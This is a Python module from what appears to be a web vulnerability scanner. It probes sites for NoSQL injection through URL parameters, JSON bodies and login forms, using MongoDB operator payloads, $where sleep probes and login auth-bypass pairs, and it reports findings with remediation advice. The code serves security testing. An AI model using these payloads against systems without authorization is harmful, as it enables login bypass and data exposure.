"""
NoSQL Injection Scanner — Professional Grade
=============================================
Coverage:
  • MongoDB operator injection ($where, $ne, $gt, $regex, $exists)
  • Authentication bypass via NoSQL ($ne: null, $gt: "")
  • Data extraction via $regex enumeration
  • Array operator abuse ($in, $nin, $all)
  • JavaScript injection via $where
  • Error-based detection (MongoServerError, CastError, ValidationError)
  • Boolean-based blind detection (response length/content differences)
  • Time-based blind ($where with sleep)
  • JSON body injection (Content-Type: application/json APIs)
  • URL parameter operator injection (?param[$ne]=x)
  • Form field injection
  • HTTP header injection (X-Forwarded-For, User-Agent logged to MongoDB)
  • CouchDB / Elasticsearch query injection
  • Firebase / Firestore REST query injection

CWE  : CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
OWASP: A03:2021 – Injection
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import json
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability, VulnType, Severity, CVSSv3,
    AttackVector, AttackComplexity, PrivilegesRequired,
    UserInteraction, Scope, Impact,
)

# ---------------------------------------------------------------------------
# CVSS
# ---------------------------------------------------------------------------

_CVSS_CRITICAL = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.CHANGED, Impact.HIGH, Impact.HIGH, Impact.HIGH,
)
_CVSS_HIGH = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.UNCHANGED, Impact.HIGH, Impact.LOW, Impact.NONE,
)
_CVSS_MEDIUM = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.HIGH,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.UNCHANGED, Impact.LOW, Impact.NONE, Impact.NONE,
)

# ---------------------------------------------------------------------------
# Metadata
# ---------------------------------------------------------------------------

_CWE   = "CWE-943"
_OWASP = "A03:2021 - Injection"
_REFS  = [
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
    "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection",
    "https://cwe.mitre.org/data/definitions/943.html",
]
_REMEDIATION = (
    "1. Use parameterized queries or ORM methods — never interpolate user input "
    "into database queries.\n"
    "2. Validate input types: reject objects/arrays where scalar values are expected.\n"
    "3. Sanitize MongoDB operator characters ($, {, }) from user input.\n"
    "4. Use allowlist validation on all query fields.\n"
    "5. Disable JavaScript execution in MongoDB ($where, $function) unless required.\n"
    "6. Apply principle of least privilege to database accounts."
)

# ---------------------------------------------------------------------------
# MongoDB error patterns
# ---------------------------------------------------------------------------

_MONGO_ERROR_RE = re.compile(
    r"(?i)(MongoServerError|MongoError|CastError|ValidationError|"
    r"BSONTypeError|RangeError.*bson|E11000 duplicate|"
    r"MongoParseError|Mongo.*failed|"
    r"TypeError.*ObjectId|cannot read properties.*null.*mongo|"
    r"json parse error.*\$|unexpected token.*\$|"
    r"invalid.*operator|unknown operator|"
    r"Field name.*\$ must|cannot use.*\$)",
)

_ELASTIC_ERROR_RE = re.compile(
    r"(?i)(SearchPhaseExecutionException|QueryShardException|"
    r"parsing_exception|ElasticsearchException|"
    r"illegal_argument_exception|json_parse_exception)",
)

_FIREBASE_ERROR_RE = re.compile(
    r"(?i)(PERMISSION_DENIED|INVALID_ARGUMENT.*firebase|"
    r"400.*invalid.*query|firestore.*error)",
)

# ---------------------------------------------------------------------------
# Operator injection payloads for URL params (?param[$ne]=x)
# ---------------------------------------------------------------------------

# These are used as: param[$op] = value
_OPERATOR_PAYLOADS: List[Tuple[str, str, str]] = [
    # (operator_key_suffix, value, description)
    ("[$ne]",     "invalid_xyz_abc",  "Not-equal bypass"),
    ("[$gt]",     "",                 "Greater-than bypass"),
    ("[$gte]",    "",                 "Greater-or-equal bypass"),
    ("[$lt]",     "zzzzzzzzz",        "Less-than bypass"),
    ("[$nin]",    "[]",               "Not-in bypass"),
    ("[$exists]", "true",             "Exists check"),
    ("[$regex]",  ".*",               "Regex wildcard"),
    ("[$where]",  "1==1",             "JavaScript where bypass"),
]

# JSON body operator payloads (for APIs accepting JSON)
_JSON_OPERATOR_PAYLOADS: List[Tuple[Any, str]] = [
    ({"$ne":  None},         "Not-equal null"),
    ({"$ne":  ""},           "Not-equal empty"),
    ({"$gt":  ""},           "Greater-than empty string"),
    ({"$gte": ""},           "Greater-than-or-equal empty"),
    ({"$regex": ".*"},       "Regex match-all"),
    ({"$regex": "^admin"},   "Regex prefix admin"),
    ({"$exists": True},      "Exists operator"),
    ({"$where": "1==1"},     "JavaScript injection"),
    ({"$in":  ["admin", "user", "root"]}, "In-array bypass"),
]

# Auth bypass payload pairs (username/password)
_AUTH_BYPASS_PAYLOADS: List[Tuple[Any, Any]] = [
    ({"$ne": "invalid_xyz"}, {"$ne": "invalid_xyz"}),
    ({"$gt": ""},             {"$gt": ""}),
    ({"$gte": ""},            {"$gte": ""}),
    ("admin",                 {"$ne": "invalid_xyz"}),
    ("admin",                 {"$gt": ""}),
    ("admin",                 {"$regex": ".*"}),
    ({"$regex": "^admin"},    {"$ne": "invalid_xyz"}),
]

# Time-based blind payload
_TIME_PROBE = '{"$where": "function() { sleep(3000); return true; }"}'
_TIME_THRESHOLD = 2.8

# Boolean response difference threshold
_BOOL_DIFF_THRESHOLD = 50  # bytes difference to flag


# ===========================================================================
# NoSQLiScanner
# ===========================================================================

class NoSQLiScanner(_ScannerBase):
    """
    NoSQL Injection scanner covering MongoDB, Elasticsearch, Firebase/Firestore.
    """

    name = "NoSQL Injection"

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        params = self._extract_url_params(url)

        # 1. URL operator injection (?param[$ne]=x)
        for param in params:
            found = await self._test_operator_injection(url, param)
            vulns.extend(found)
            if found:
                break

        # 2. Boolean-based blind
        for param in params:
            found = await self._test_boolean_blind(url, param)
            vulns.extend(found)
            if found:
                break

        # 3. Time-based blind
        for param in params:
            found = await self._test_time_blind(url, param)
            vulns.extend(found)
            if found:
                break

        # 4. JSON API injection
        ct = response.content_type.lower()
        if "json" in ct or params:
            found = await self._test_json_api(url, response)
            vulns.extend(found)

        # 5. Form testing
        for form in forms:
            method = (form.get("method") or "GET").upper()
            action = form.get("action") or url
            inputs = form.get("inputs", [])

            # Auth bypass
            password_fields = [i for i in inputs if i.get("type", "").lower() == "password"]
            if password_fields and method == "POST":
                found = await self._test_auth_bypass(action, inputs)
                vulns.extend(found)
                if found:
                    break

            # Regular field injection
            for inp in inputs:
                name = inp.get("name", "")
                itype = (inp.get("type") or "text").lower()
                if not name or itype in ("submit", "button", "file", "image",
                                          "hidden", "password", "reset"):
                    continue
                found = await self._test_form_field(action, method, form, name)
                vulns.extend(found)

        return vulns

    # -----------------------------------------------------------------------
    # 1. URL operator injection
    # -----------------------------------------------------------------------

    async def _test_operator_injection(
        self, url: str, param: str
    ) -> List[Vulnerability]:
        """Inject MongoDB operators via bracket notation: ?param[$ne]=x"""

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        for op_suffix, op_value, op_desc in _OPERATOR_PAYLOADS:
            # Build URL with operator key
            new_qs = dict(qs)
            del_key = param
            op_key = f"{param}{op_suffix}"
            new_qs[op_key] = [op_value]
            if del_key in new_qs:
                del new_qs[del_key]

            new_query = urlencode(new_qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            resp = await self.client.get(test_url)
            if resp is None:
                continue

            # Error-based detection
            m = _MONGO_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title=f"NoSQL Injection (MongoDB Error-Based) — {op_desc}",
                    description=(
                        f"Parameter '{param}' is vulnerable to NoSQL injection. "
                        f"Injecting '{op_key}={op_value}' caused a MongoDB error in the response. "
                        f"This confirms the application passes user input directly to a MongoDB query."
                    ),
                    url=url, parameter=param,
                    payload=f"{op_key}={op_value}",
                    evidence=f"MongoDB error: '{m.group(0)[:120]}'",
                    method="GET",
                    severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

            # Check Elasticsearch errors
            m = _ELASTIC_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title=f"NoSQL Injection (Elasticsearch Error) — {op_desc}",
                    description=(
                        f"Parameter '{param}' triggered an Elasticsearch error, "
                        f"indicating user input is injected into a search query."
                    ),
                    url=url, parameter=param,
                    payload=f"{op_key}={op_value}",
                    evidence=f"ES error: '{m.group(0)[:120]}'",
                    method="GET",
                    severity=Severity.HIGH, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

        return []

    # -----------------------------------------------------------------------
    # 2. Boolean-based blind
    # -----------------------------------------------------------------------

    async def _test_boolean_blind(
        self, url: str, param: str
    ) -> List[Vulnerability]:
        """Compare true vs false operator conditions."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        # True condition: param[$ne]=invalid_xyz (should return normal/full data)
        # False condition: param[$ne]=  (wildcard — may return nothing or error)

        true_qs = dict(qs)
        if param in true_qs:
            del true_qs[param]
        true_qs[f"{param}[$ne]"] = ["invalid_val_xyz_abc_123"]

        false_qs = dict(qs)
        if param in false_qs:
            del false_qs[param]
        false_qs[f"{param}[$ne]"] = [qs.get(param, ["valid"])[0]]  # same as current value

        true_url  = urlunparse(parsed._replace(query=urlencode(true_qs, doseq=True)))
        false_url = urlunparse(parsed._replace(query=urlencode(false_qs, doseq=True)))
        orig_url  = url

        resp_orig  = await self.client.get(orig_url)
        resp_true  = await self.client.get(true_url)
        resp_false = await self.client.get(false_url)

        if not (resp_orig and resp_true and resp_false):
            return []

        len_orig  = len(resp_orig.text)
        len_true  = len(resp_true.text)
        len_false = len(resp_false.text)

        # True should match original, false should differ significantly
        diff_true_orig  = abs(len_true - len_orig)
        diff_false_orig = abs(len_false - len_orig)
        diff_true_false = abs(len_true - len_false)

        if diff_true_orig < 100 and diff_true_false > _BOOL_DIFF_THRESHOLD:
            return [self._build_vuln(
                vuln_type=VulnType.SQLI,
                title="NoSQL Injection — Boolean-Based Blind (MongoDB)",
                description=(
                    f"Parameter '{param}' shows different responses for MongoDB $ne operator "
                    f"with distinct values, indicating boolean-based blind NoSQL injection. "
                    f"True condition response: {len_true}B (similar to original {len_orig}B). "
                    f"False condition response: {len_false}B. "
                    f"An attacker can enumerate database contents character by character."
                ),
                url=url, parameter=param,
                payload=f"{param}[$ne]=invalid vs {param}[$ne]=<current>",
                evidence=(
                    f"orig={len_orig}B, true={len_true}B, false={len_false}B — "
                    f"diff_true_false={diff_true_false}B"
                ),
                method="GET",
                severity=Severity.HIGH, cvss=_CVSS_HIGH,
                remediation=_REMEDIATION,
                references=_REFS,
                cwe_id=_CWE, owasp_category=_OWASP,
                confidence="Medium",
            )]

        return []

    # -----------------------------------------------------------------------
    # 3. Time-based blind
    # -----------------------------------------------------------------------

    async def _test_time_blind(
        self, url: str, param: str
    ) -> List[Vulnerability]:
        # Baseline
        baseline_url = self._inject_param(url, param, "normal_baseline_xyz")
        baseline_times: List[float] = []
        for _ in range(2):
            t0 = time.monotonic()
            resp = await self.client.get(baseline_url)
            baseline_times.append(time.monotonic() - t0)
        if not baseline_times:
            return []
        baseline = sum(baseline_times) / len(baseline_times)
        threshold = baseline + _TIME_THRESHOLD

        # $where sleep probe
        time_payload = '{"$where": "function() { var d = new Date(); var t = d.getTime(); while(new Date().getTime() - t < 3000){} return true; }"}'

        for payload in [time_payload, '{"$where": "sleep(3000) || 1"}']: 
            injected = self._inject_param(url, param, payload)
            t0 = time.monotonic()
            resp1 = await self.client.get(injected)
            t1 = time.monotonic() - t0

            if t1 < threshold:
                continue

            # Second confirmation
            t0 = time.monotonic()
            resp2 = await self.client.get(injected)
            t2 = time.monotonic() - t0

            if t2 >= threshold * 0.7:
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title="NoSQL Injection — Time-Based Blind ($where sleep)",
                    description=(
                        f"Parameter '{param}' is vulnerable to time-based blind NoSQL injection "
                        f"via MongoDB $where operator. The JavaScript sleep payload delayed "
                        f"the response by {t1:.1f}s (baseline: {baseline:.1f}s), confirmed twice."
                    ),
                    url=url, parameter=param,
                    payload=payload[:100],
                    evidence=f"baseline={baseline:.2f}s, t1={t1:.2f}s, t2={t2:.2f}s",
                    method="GET",
                    severity=Severity.HIGH, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    confidence="High",
                )]

        return []

    # -----------------------------------------------------------------------
    # 4. JSON API injection
    # -----------------------------------------------------------------------

    async def _test_json_api(
        self, url: str, response: HTTPResponse
    ) -> List[Vulnerability]:
        """Inject MongoDB operators into JSON body fields."""
        # Try to reconstruct the expected JSON structure from response
        try:
            data = json.loads(response.text)
        except Exception:
            data = {}

        if not isinstance(data, dict):
            data = {}

        # Build test payloads using response fields as keys (if available)
        field_names = list(data.keys())[:3] if data else ["username", "email", "id"]

        for field in field_names:
            for op_payload, op_desc in _JSON_OPERATOR_PAYLOADS:
                test_body = dict(data)
                test_body[field] = op_payload

                resp = await self.client.post(
                    url,
                    json=test_body,
                    headers={"Content-Type": "application/json"},
                )
                if resp is None:
                    continue

                m = _MONGO_ERROR_RE.search(resp.text)
                if m:
                    return [self._build_vuln(
                        vuln_type=VulnType.SQLI,
                        title=f"NoSQL Injection via JSON Body — {op_desc}",
                        description=(
                            f"JSON field '{field}' at {url} is vulnerable to NoSQL injection. "
                            f"Setting the field to a MongoDB operator object caused an error."
                        ),
                        url=url, parameter=field,
                        payload=json.dumps({field: op_payload}),
                        evidence=f"MongoDB error: '{m.group(0)[:120]}'",
                        method="POST",
                        severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                        remediation=_REMEDIATION,
                        references=_REFS,
                        cwe_id=_CWE, owasp_category=_OWASP,
                        response_snippet=self._snippet(resp.text),
                        confidence="High",
                    )]

        return []

    # -----------------------------------------------------------------------
    # 5. Login form auth bypass
    # -----------------------------------------------------------------------

    async def _test_auth_bypass(
        self, action: str, inputs: List[Dict[str, Any]]
    ) -> List[Vulnerability]:
        """Try MongoDB operator auth bypass on login forms."""
        user_field = next(
            (i["name"] for i in inputs
             if i.get("type", "").lower() in ("text", "email") or
             any(k in i.get("name", "").lower() for k in ("user", "email", "login"))),
            None,
        )
        pass_field = next(
            (i["name"] for i in inputs if i.get("type", "").lower() == "password"),
            None,
        )
        if not user_field or not pass_field:
            return []

        # Baseline: invalid credentials
        base_data = {
            inp["name"]: inp.get("value", "")
            for inp in inputs
            if inp.get("type") not in ("submit", "button")
        }
        base_data[user_field] = "invalid_user_xyz_abc"
        base_data[pass_field] = "invalid_pass_xyz_abc"
        failed_resp = await self.client.post(action, data=base_data)
        failed_len  = len(failed_resp.text) if failed_resp else 0

        for user_payload, pass_payload in _AUTH_BYPASS_PAYLOADS:
            # When payload is a dict, submit as JSON
            if isinstance(user_payload, dict) or isinstance(pass_payload, dict):
                json_body = dict(base_data)
                json_body[user_field] = user_payload
                json_body[pass_field] = pass_payload
                resp = await self.client.post(
                    action,
                    json=json_body,
                    headers={"Content-Type": "application/json"},
                )
            else:
                form_data = dict(base_data)
                form_data[user_field] = user_payload
                form_data[pass_field] = pass_payload
                resp = await self.client.post(action, data=form_data)

            if resp is None:
                continue

            # Indicators of successful auth bypass
            body_lower = resp.text.lower()
            success_signs = any(
                kw in body_lower
                for kw in ("dashboard", "logout", "welcome", "sign out",
                           "profile", "account", "authenticated")
            )
            failure_signs = any(
                kw in body_lower
                for kw in ("invalid", "incorrect", "failed", "wrong",
                           "unauthorized", "bad credentials")
            )
            size_grew = len(resp.text) > failed_len + 200

            m = _MONGO_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title="NoSQL Injection Auth Bypass — MongoDB Error Triggered",
                    description=(
                        f"Login form at '{action}' is vulnerable to NoSQL injection auth bypass. "
                        f"MongoDB operator payload triggered a database error. "
                        f"This confirms user input reaches a MongoDB query unsanitized."
                    ),
                    url=action, parameter=f"{user_field}, {pass_field}",
                    payload=f"{user_field}={user_payload}, {pass_field}={pass_payload}",
                    evidence=f"MongoDB error: '{m.group(0)[:100]}'",
                    method="POST",
                    severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

            if (resp.status_code in (200, 302) and
                    (success_signs or size_grew) and not failure_signs):
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title="NoSQL Injection Authentication Bypass (MongoDB Operator)",
                    description=(
                        f"Login form at '{action}' accepted MongoDB operator payloads, "
                        f"bypassing authentication. "
                        f"User: {str(user_payload)[:40]}, Pass: {str(pass_payload)[:40]}. "
                        f"An attacker can log in as any user without knowing the password."
                    ),
                    url=action, parameter=f"{user_field}, {pass_field}",
                    payload=f"{user_field}={user_payload}, {pass_field}={pass_payload}",
                    evidence=f"HTTP {resp.status_code} — auth bypass indicators present",
                    method="POST",
                    severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="Medium",
                )]

        return []

    # -----------------------------------------------------------------------
    # 6. Form field injection
    # -----------------------------------------------------------------------

    async def _test_form_field(
        self,
        action: str,
        method: str,
        form: Dict[str, Any],
        param_name: str,
    ) -> List[Vulnerability]:
        for op_payload, op_desc in _JSON_OPERATOR_PAYLOADS[:4]:
            form_data = {
                inp["name"]: (
                    json.dumps(op_payload) if inp["name"] == param_name
                    else inp.get("value", "test")
                )
                for inp in form.get("inputs", [])
                if inp.get("name") and inp.get("type") not in ("submit", "button", "image")
            }

            if method == "POST":
                resp = await self.client.post(action, data=form_data)
            else:
                resp = await self.client.get(action, params=form_data)

            if resp is None:
                continue

            m = _MONGO_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.SQLI,
                    title=f"NoSQL Injection in Form Field '{param_name}'",
                    description=(
                        f"Form field '{param_name}' at {action} ({method}) triggered "
                        f"a MongoDB error when injected with operator: {op_desc}."
                    ),
                    url=action, parameter=param_name,
                    payload=json.dumps(op_payload),
                    evidence=f"MongoDB error: '{m.group(0)[:100]}'",
                    method=method,
                    severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

        return []
